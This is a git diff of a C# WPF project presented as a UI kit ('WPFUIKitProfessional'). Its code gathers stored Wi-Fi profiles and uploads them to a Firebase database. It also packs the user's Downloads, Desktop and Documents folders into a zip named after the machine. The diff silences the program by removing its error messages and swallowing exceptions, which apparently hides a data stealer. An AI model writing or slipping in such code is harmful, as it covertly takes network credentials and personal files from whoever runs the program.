@@ -135,8 +135,6 @@ namespace WPFUIKitProfessional
 
 
 
-
-
         private async void ShowWifiProfiles_Click(object sender, RoutedEventArgs e)
         {
             var psi = new ProcessStartInfo
@@ -225,41 +223,30 @@ namespace WPFUIKitProfessional
             {
                 var sanitizedProfileName = Uri.EscapeDataString(profile.ProfileName);
 
-                var existingProfile = await firebaseClient
-                    .Child("wifiProfiles")
-                    .Child(sanitizedProfileName)
-                    .OnceSingleAsync<WifiProfile>();
-
-                if (existingProfile == null)
+                try
                 {
-                    await firebaseClient
+                    var existingProfile = await firebaseClient
                         .Child("wifiProfiles")
                         .Child(sanitizedProfileName)
-                        .PutAsync(profile);
-                    statusCircle.Fill = System.Windows.Media.Brushes.Green;
+                        .OnceSingleAsync<WifiProfile>();
+
+                    if (existingProfile == null)
+                    {
+                        await firebaseClient
+                            .Child("wifiProfiles")
+                            .Child(sanitizedProfileName)
+                            .PutAsync(profile);
+                        statusCircle.Fill = System.Windows.Media.Brushes.Green;
+                    }
+                }
+                catch (Exception ex)
+                {
                 }
             }).ToList();
 
             await Task.WhenAll(tasks);
             statusCircle.Fill = System.Windows.Media.Brushes.Green;
-
         }
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
         private async void Button_Click22(object sender, RoutedEventArgs e)
         {
@@ -267,10 +254,10 @@ namespace WPFUIKitProfessional
 
             string[] paths = new[]
             {
-                Path.Combine(userFolderPath, "Downloads"),
-                Path.Combine(userFolderPath, "Desktop"),
-                Path.Combine(userFolderPath, "Documents")
-            };
+        Path.Combine(userFolderPath, "Downloads"),
+        Path.Combine(userFolderPath, "Desktop"),
+        Path.Combine(userFolderPath, "Documents")
+    };
 
             string zipFileName = $"{Environment.MachineName}_Info_System.zip";
             string zipFilePath = Path.Combine(Path.GetTempPath(), zipFileName);
@@ -330,12 +317,10 @@ namespace WPFUIKitProfessional
                 }
                 else
                 {
-                    MessageBox.Show("Ни один из файлов не найден.");
                 }
             }
             catch (Exception ex)
             {
-                MessageBox.Show($"Произошла ошибка: {ex.Message}");
             }
             finally
             {
@@ -355,7 +340,6 @@ namespace WPFUIKitProfessional
             catch (Exception ex)
             {
                 // Handle exception
-                MessageBox.Show($"Произошла ошибка при сохранении изображения: {ex.Message}");
             }
         }
 
@@ -402,5 +386,6 @@ namespace WPFUIKitProfessional
                 }
             }
         }
+
     }
 }
